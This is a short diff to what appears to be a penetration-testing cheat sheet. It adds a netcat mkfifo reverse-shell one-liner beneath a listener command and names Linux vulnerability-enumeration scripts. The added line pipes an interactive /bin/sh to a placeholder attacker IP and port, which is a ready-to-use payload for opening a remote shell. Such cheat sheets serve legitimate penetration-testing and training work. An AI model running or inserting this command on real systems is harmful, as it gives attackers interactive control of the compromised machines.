@@ -3,6 +3,8 @@
 ```shell
 # Listen for reverse shell
 nc -lnvp <port number> 
+# Use netcat for reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip address> <port> >/tmp/f
 ```
 **les.sh, LinEnum.sh, lse.sh (Recommended)** : Use for detect vuln in Linux machine
 
